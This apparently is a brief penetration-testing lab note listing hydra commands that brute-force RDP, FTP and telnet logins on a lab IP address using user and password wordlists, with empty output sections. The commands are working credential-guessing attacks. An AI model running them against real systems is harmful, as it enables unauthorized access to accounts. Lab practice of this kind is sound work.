## RDP

```bash
banister@~/projects/OreshicRecord kali$ hydra -L ./user.txt -P ./pass.txt rdp://10.129.71.163 -s 3389 -f -V
```

```
```

## FTP

```bash
banister@~/projects/OreshicRecord kali$ hydra -L ./user.txt -P ./pass.txt ftp://10.129.71.163 -f -V
```

```
```

## telnet

```bash
banister@~/projects/OreshicRecord kali$ hydra -L ./user.txt -P ./pass.txt telnet://10.129.71.163 -f -V
```

```
```

